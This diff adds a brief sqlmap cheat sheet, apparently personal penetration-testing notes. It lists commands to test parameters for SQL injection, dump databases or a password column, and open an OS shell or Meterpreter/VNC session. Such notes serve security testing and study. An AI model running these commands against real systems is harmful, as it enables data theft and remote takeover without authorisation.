@@ -1,0 +1,44 @@
+=== SQLMap === 
+
+Automatic SQL injection scanner 
+
+sqlmap -u "<url>" --dump 
+
+sqlmap -u "<url>" --os-shell 
+
+Post fields: 
+
+	-- data="USER=A&PASS=BB" 
+
+Risk Level: 
+	
+	-- risk=3
+
+
+Examples: 
+
+	sqlmap -r /home/h/burprequest1 -p password
+			-p - param to test for injection<br>
+			-r - request saved from Burp Suite 
+
+When found vulnerable param, dump all the DB entries 
+
+	sqlmap -r /home/h/burprequest1 -p vuln-param --dump-all
+
+
+Specify table and columns:
+
+	sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk
+			-C - column 
+			-T - table
+			-D - database
+
+
+Try getting the OS Shell
+	
+	sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-shell
+
+Try getting the OS Shell via Meterpreter or VNC
+	
+	sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-pwn
+
